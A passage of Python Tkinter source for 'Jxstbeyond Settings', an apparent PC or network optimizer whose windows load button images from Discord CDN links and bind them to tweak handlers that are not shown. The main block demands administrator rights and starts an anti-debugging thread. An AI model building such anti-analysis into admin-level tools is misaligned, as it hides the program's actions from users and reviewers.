    window_one.attributes('-topmost', 1)

    canvas = Canvas(window_one,bg = "#111827",height = 500,width = 700,bd = 0,highlightthickness = 0,relief = "ridge")

    canvas.place(x = 0, y = 0)
    image_image_1 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298126172241/image_1.png?ex=65805a7b&is=656de57b&hm=5a3226c4763948a6dc4972645280621a1f7f455e371d1379f5c54af4851c541f&", stream=True).raw))
    image_1 = canvas.create_image(80.0,250.0,image=image_image_1)
    
    image_image_2 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298365239417/image_2.png?ex=65805a7b&is=656de57b&hm=e59b98cd0725601eb9471a32a22b55ed3f2f05678c4e0fc6e980f84ce848dd8a&", stream=True).raw))
    image_2 = canvas.create_image(80.0,166.0,image=image_image_2)
    canvas.tag_bind(image_2, '<Button-1>', warring_page)
    
    image_image_3 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298642075648/image_3.png?ex=65805a7b&is=656de57b&hm=e917b9ecd4b92c0484cd1c29cb7bda5823779e713834c9ea906c7658f6b6f429&", stream=True).raw))
    image_3 = canvas.create_image(73.5,252.0,image=image_image_3)
    canvas.tag_bind(image_3, '<Button-1>', warring)
    
    image_image_4 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298914693180/image_4.png?ex=65805a7b&is=656de57b&hm=890de82f99b1c50fca0c1ab39183cc2a2a121d4342e2faba87e7dfdbeffa28cc&", stream=True).raw))
    image_4 = canvas.create_image(74.5,209.0,image=image_image_4)
    canvas.tag_bind(image_4, '<Button-1>', join_page_two)
    
    image_image_5 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244299208306688/image_5.png?ex=65805a7b&is=656de57b&hm=df711edbae159e6dcc259736a7e52dd7d7f1bd06e335d4be5528e72a6665d93f&", stream=True).raw))
    image_5 = canvas.create_image(79.0,430.0,image=image_image_5)
    canvas.tag_bind(image_5, '<Button-1>', cmdset1)
    
    image_image_6_fix = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181830331733643397/image_6.png?ex=65827c44&is=65700744&hm=0b7c15ad95dd654d82392af5eee4c0f078d546e95372b1bdad5aade484263793&", stream=True).raw))
    image_6_fix = canvas.create_image(77.0,391.0,image=image_image_6_fix)
    canvas.tag_bind(image_6_fix, '<Button-1>', fixerror)
    
    image_image_6 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244299497709618/image_6.png?ex=65805a7b&is=656de57b&hm=d12523408fa3fe8bc6d90675c938d0b850281748b9efc43e0de15832e57a240a&", stream=True).raw))
    image_6 = canvas.create_image(46.0,473.0,image=image_image_6)
    canvas.tag_bind(image_6, '<Button-1>', facebook)
    
    image_image_7 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244299891966002/image_7.png?ex=65805a7b&is=656de57b&hm=1fed0bb4a94522bbb35193a4d60a660ec4b532cfe48f59427636e6c717ff1358&", stream=True).raw))
    image_7 = canvas.create_image(117.0,473.0,image=image_image_7)
    canvas.tag_bind(image_7, '<Button-1>', discord)
    
    image_image_8 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244300290437150/image_8.png?ex=65805a7b&is=656de57b&hm=0362aecd04db81b1e7acb0f6d9d421de0a35d6d4226eff73c9fb255ddfd28850&", stream=True).raw))
    image_8 = canvas.create_image(35.0,50.0,image=image_image_8)
    
    image_image_9 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244300550471700/image_9.png?ex=65805a7b&is=656de57b&hm=e863151f1442a4862c5064be4d4297e5616013c0afd23ef9e020e0d93ef88cdf&", stream=True).raw))
    image_9 = canvas.create_image(111.0,41.0,image=image_image_9)
    
    image_image_10 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244312894328882/image_10.png?ex=65805a7e&is=656de57e&hm=3730a0027fab4ca6df47bdd39bdec66ef83076ddc0731c17c06f6022a860e834&", stream=True).raw))
    image_10 = canvas.create_image(144.0,59.0,image=image_image_10)

    canvas.create_text(6.0,98.0,anchor="nw",text=f"USER : {mypcname}",fill="#FFFFFF",font=("ABeeZee Regular", 14 * -1))

    canvas.create_text(6.0,117.0,anchor="nw",text=f"Version : {Version}",fill="#FFFFFF",font=("ABeeZee Regular", 14 * -1))

    image_image_12 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245357926121653/image_12.png?ex=65805b77&is=656de677&hm=b4cf35db476ab9b0fbda7eb911575b4486b279ae0dbfbeea4870d5a6d65c93fd&", stream=True).raw))
    image_12 = canvas.create_image(300.0,116.0,image=image_image_12)
    canvas.tag_bind(image_12, '<Button-1>', cmdset1_jenos)
    
    image_image_13 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245364112719962/image_13.png?ex=65805b79&is=656de679&hm=b6dfe4a9df3c8dbfd6b3ab17172dbe5964deb2765ce4917728498d1e0ba17d28&", stream=True).raw))
    image_13 = canvas.create_image(501.0,116.0,image=image_image_13)
    canvas.tag_bind(image_13, '<Button-1>', cmdset2_jenos)
    
    image_image_14 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245371360497765/image_14.png?ex=65805b7b&is=656de67b&hm=4515c5fc4b26bacfd5b1f619e64d6ffedb6cc4d021a15dff9b90b246320d5b6c&", stream=True).raw))
    image_14 = canvas.create_image(492.0,170.0,image=image_image_14)
    canvas.tag_bind(image_14, '<Button-1>', cmdset3_jenos)
    
    image_image_15 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245377576448070/image_15.png?ex=65805b7c&is=656de67c&hm=2df8666d11cfd12cc9022e36e0a7cbd469fb10dac4996b34f6198fb22f09b4f0&", stream=True).raw))
    image_15 = canvas.create_image(288.0,170.0,image=image_image_15)
    canvas.tag_bind(image_15, '<Button-1>', cmdset4_jenos)
    
    image_image_16 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245384866140334/image_16.png?ex=65805b7e&is=656de67e&hm=890e394ec6c9398051f07e8cee2a6890464db2891225935604a2c41933de6a56&", stream=True).raw))
    image_16 = canvas.create_image(303.0,269.0,image=image_image_16)
    canvas.tag_bind(image_16, '<Button-1>', RunSuperiorPunching)
    
    image_image_17 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245392470413322/image_17.png?ex=65805b80&is=656de680&hm=d8d972a92f5df0cd7f8eda311041b61f0653ccb4fcad0b123aadbfc36451ffee&", stream=True).raw))
    image_17 = canvas.create_image(517.0,268.0,image=image_image_17)
    canvas.tag_bind(image_17, '<Button-1>', RunUnbeatableNetwork)
    
    image_image_18 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245978750238780/image_18.png?ex=65805c0b&is=656de70b&hm=f8f8de070fb1f70231508d39c80f6c96f4e800520f78902d2ffed72c2e8ba8d8&", stream=True).raw))
    image_18 = canvas.create_image(504.0,322.0,image=image_image_18)
    canvas.tag_bind(image_18, '<Button-1>', Y2KREALPUNCH)
    
    image_image_19 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245400867405915/image_19.png?ex=65805b82&is=656de682&hm=59c19e7991f725c2902596785a0f6c8097d408c95b731c17f50bdb354ad826ea&", stream=True).raw))
    image_19 = canvas.create_image(291.0,322.0,image=image_image_19)
    canvas.tag_bind(image_19, '<Button-1>', J3Ke3NEtwork)
    
    image_image_11 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245340591071273/image_11.png?ex=65805b73&is=656de673&hm=01b554d1a6bf3b8fba014dc3f2a1c5d727ee6a703c84c128c91a5b3bc7c24f6a&", stream=True).raw))
    image_11 = canvas.create_image(625.0,24.0,image=image_image_11)
    
    image_image_20 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245407716708372/image_20.png?ex=65805b83&is=656de683&hm=3ff31ff0677f48b2c83a6b01a99343e256da301406f651112b7a3364fffb0095&", stream=True).raw))
    image_20 = canvas.create_image(231.0,150.0,image=image_image_20)
    
    image_image_21 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245412653412392/image_21.png?ex=65805b84&is=656de684&hm=2791d086a8d70e876b042d947e0e09216f6fea4231a9f608494797c08d5259b8&", stream=True).raw))
    image_21 = canvas.create_image(605.0,42.0,image=image_image_21)

    image_image_22 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181245068099723336/1181245421360787566/image_22.png?ex=65805b86&is=656de686&hm=4ae7dfe5bcd57af46f81eff80c5bfd50d7b68fe853c81e51bb2678ac0b8c5e75&", stream=True).raw))
    image_22 = canvas.create_image(495.0,454.0,image=image_image_22)
    
    window_one.resizable(False, False)
    window_one.mainloop()
def page_two ():
    global window_two
    window_two = Tk()
    window_two.protocol("WM_DELETE_WINDOW", _on_close)
    window_two.title(f"Jxstbeyond Settings | User : {mypcname} | Optimite PC | PRP - Sercurity")
    logo = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181251569539366962/1181327366409179167/logo.png?ex=6580a7d8&is=656e32d8&hm=091b9d5c0ba456d4ad65b1522dd5a2ea6ad5970309d75e1fa07d7da18f3ccaa8&", stream=True).raw))
    window_two.iconphoto(False,logo)

    window_two.configure(bg = "#111827")
    width_of_window_login = 700
    height_of_window_login = 500
    labels = []  
    screen_width = window_two.winfo_screenwidth()
    screen_height = window_two.winfo_screenheight()
    x_coordinate = (screen_width/2)-(width_of_window_login/2)
    y_coordinate = (screen_height/2)-(height_of_window_login/2)
    window_two.geometry("%dx%d+%d+%d" %(width_of_window_login,height_of_window_login,x_coordinate,y_coordinate))
    window_two.resizable(False, False)   
    window_two.attributes('-topmost', 1)

    canvas = Canvas(window_two,bg = "#111827",height = 500,width = 700,bd = 0,highlightthickness = 0,relief = "ridge")

    canvas.place(x = 0, y = 0)
    image_image_1 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298126172241/image_1.png?ex=65805a7b&is=656de57b&hm=5a3226c4763948a6dc4972645280621a1f7f455e371d1379f5c54af4851c541f&", stream=True).raw))
    image_1 = canvas.create_image(80.0,250.0,image=image_image_1)
    
    image_image_2 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298365239417/image_2.png?ex=65805a7b&is=656de57b&hm=e59b98cd0725601eb9471a32a22b55ed3f2f05678c4e0fc6e980f84ce848dd8a&", stream=True).raw))
    image_2 = canvas.create_image(80.0,166.0,image=image_image_2)
    canvas.tag_bind(image_2, '<Button-1>', join_page_one)
    
    image_image_3 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298642075648/image_3.png?ex=65805a7b&is=656de57b&hm=e917b9ecd4b92c0484cd1c29cb7bda5823779e713834c9ea906c7658f6b6f429&", stream=True).raw))
    image_3 = canvas.create_image(73.5,252.0,image=image_image_3)
    canvas.tag_bind(image_3, '<Button-1>', warring)
    
    image_image_4 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244298914693180/image_4.png?ex=65805a7b&is=656de57b&hm=890de82f99b1c50fca0c1ab39183cc2a2a121d4342e2faba87e7dfdbeffa28cc&", stream=True).raw))
    image_4 = canvas.create_image(74.5,209.0,image=image_image_4)
    canvas.tag_bind(image_4, '<Button-1>', warring_page)
    
    image_image_5 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244299208306688/image_5.png?ex=65805a7b&is=656de57b&hm=df711edbae159e6dcc259736a7e52dd7d7f1bd06e335d4be5528e72a6665d93f&", stream=True).raw))
    image_5 = canvas.create_image(79.0,430.0,image=image_image_5)
    canvas.tag_bind(image_5, '<Button-1>', cmdset1)
    
    image_image_6_fix = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181830331733643397/image_6.png?ex=65827c44&is=65700744&hm=0b7c15ad95dd654d82392af5eee4c0f078d546e95372b1bdad5aade484263793&", stream=True).raw))
    image_6_fix = canvas.create_image(77.0,391.0,image=image_image_6_fix)
    canvas.tag_bind(image_6_fix, '<Button-1>', fixerror)
    
    image_image_6 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244299497709618/image_6.png?ex=65805a7b&is=656de57b&hm=d12523408fa3fe8bc6d90675c938d0b850281748b9efc43e0de15832e57a240a&", stream=True).raw))
    image_6 = canvas.create_image(46.0,473.0,image=image_image_6)
    canvas.tag_bind(image_6, '<Button-1>', facebook)
    
    image_image_7 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244299891966002/image_7.png?ex=65805a7b&is=656de57b&hm=1fed0bb4a94522bbb35193a4d60a660ec4b532cfe48f59427636e6c717ff1358&", stream=True).raw))
    image_7 = canvas.create_image(117.0,473.0,image=image_image_7)
    canvas.tag_bind(image_7, '<Button-1>', discord)
    
    image_image_8 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244300290437150/image_8.png?ex=65805a7b&is=656de57b&hm=0362aecd04db81b1e7acb0f6d9d421de0a35d6d4226eff73c9fb255ddfd28850&", stream=True).raw))
    image_8 = canvas.create_image(35.0,50.0,image=image_image_8)
    
    image_image_9 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244300550471700/image_9.png?ex=65805a7b&is=656de57b&hm=e863151f1442a4862c5064be4d4297e5616013c0afd23ef9e020e0d93ef88cdf&", stream=True).raw))
    image_9 = canvas.create_image(111.0,41.0,image=image_image_9)
    
    image_image_10 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181244224683909200/1181244312894328882/image_10.png?ex=65805a7e&is=656de57e&hm=3730a0027fab4ca6df47bdd39bdec66ef83076ddc0731c17c06f6022a860e834&", stream=True).raw))
    image_10 = canvas.create_image(144.0,59.0,image=image_image_10)

    canvas.create_text(6.0,98.0,anchor="nw",text=f"USER : {mypcname}",fill="#FFFFFF",font=("ABeeZee Regular", 14 * -1))

    canvas.create_text(6.0,117.0,anchor="nw",text=f"Version : {Version}",fill="#FFFFFF",font=("ABeeZee Regular", 14 * -1))

    image_image_11 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301639425044650/image_11.png?ex=65808fe2&is=656e1ae2&hm=b43c6fc6cbf76b7e64b9bd1b7e54385d1be68454e894479374910c20c113fca2&", stream=True).raw))
    image_11 = canvas.create_image(504.0,77.0,image=image_image_11)

    image_image_12 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301639651524718/image_12.png?ex=65808fe2&is=656e1ae2&hm=295e1d40b5807646ee82973bc3f270a5ed4ade35d623d924c010fe9cc5f79ec1&", stream=True).raw))
    image_12 = canvas.create_image(624.5,24.0,image=image_image_12)

    image_image_13 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301639911579648/image_13.png?ex=65808fe2&is=656e1ae2&hm=92c1889f1fcc717de7c36a9c3c7aba17b584fa9aaa66a06068c5c6fe887644d5&", stream=True).raw))
    image_13 = canvas.create_image(345.0,323.0,image=image_image_13)

    image_image_14 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301640163242076/image_14.png?ex=65808fe2&is=656e1ae2&hm=e0062c6052cdd291db8630c0585b6259650e1b8ac10474def3e66c22de506d20&", stream=True).raw))
    image_14 = canvas.create_image(345.0,203.0,image=image_image_14)

    image_image_15 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301640440053811/image_15.png?ex=65808fe2&is=656e1ae2&hm=159d19993ae00f0e37d0b73f8386cc3cd698db1985c7d7e42a53f7609843befc&", stream=True).raw))
    image_15 = canvas.create_image(345.0,321.0,image=image_image_15)

    image_image_16 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301640670748804/image_16.png?ex=65808fe2&is=656e1ae2&hm=65f9b22f93eba5c90b128e14dd613625bdc3471bade848b6c2c45e7964f2529f&", stream=True).raw))
    image_16 = canvas.create_image(345.0,293.0,image=image_image_16)
    canvas.tag_bind(image_16, '<Button-1>', cmdset1_Optimite)

    image_image_17 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301640893050950/image_17.png?ex=65808fe2&is=656e1ae2&hm=ba624644b92e8fe35367cd7f40543a017f2094ef7a5c99defb612f39943ee9f8&", stream=True).raw))
    image_17 = canvas.create_image(345.0,321.0,image=image_image_17)
    canvas.tag_bind(image_17, '<Button-1>', cmdset2_Optimite)

    image_image_18 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301641123725312/image_18.png?ex=65808fe2&is=656e1ae2&hm=cef3a6901b7f00c9d463f8dd84fc937275c37e8f98fc7718a41773fa548e73bb&", stream=True).raw))
    image_18 = canvas.create_image(345.0,349.0,image=image_image_18)
    canvas.tag_bind(image_18, '<Button-1>', cmdset3_Optimite)

    image_image_19 = ImageTk.PhotoImage(Image.open(requests.get("https://cdn.discordapp.com/attachments/1181301412022456440/1181301641371197511/image_19.png?ex=65808fe2&is=656e1ae2&hm=e359c878bcf1376d32223f13ec8d2674230bffb5cd0a4be4821b6832a8b20132&", stream=True).raw))
    image_19 = canvas.create_image(345.0,393.0,image=image_image_19)
    canvas.tag_bind(image_19, '<Button-1>', cmdset4_Optimite)
    
    window_two.resizable(False, False)
    window_two.mainloop()

if __name__ == "__main__":
    if is_admin():
        anti_debug_thread = AntiDebug()
        anti_debug_thread.daemon = True
        anti_debug_thread.start()
        page_login()
        
    else:
        anti_debug_thread = AntiDebug()
        anti_debug_thread.daemon = True
        anti_debug_thread.start()
        messagebox.showerror("PRP - Sercurity", "Failed! \n You are not running as administrator!")
        sys.exit()
